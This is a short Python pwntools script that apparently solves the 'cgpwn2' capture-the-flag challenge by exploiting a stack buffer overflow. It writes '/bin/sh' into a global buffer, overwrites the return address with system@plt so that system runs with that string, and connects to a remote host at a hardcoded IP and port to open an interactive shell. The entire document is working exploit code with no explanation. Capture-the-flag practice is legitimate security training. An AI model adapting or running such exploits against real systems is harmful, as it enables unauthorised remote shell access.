from pwn import *

#sh = process('./cgpwn2')
sh = remote('111.198.29.45',31749)

get_sh = p32(0x0804a080)

sys_sh = p32(0x08048420)

payload = 'a' * 0x26 + 'bbbb' + sys_sh + 'cccc' + get_sh

sh.sendline("/bin/sh")

sleep(0.1)

sh.sendline(payload)

sh.interactive()
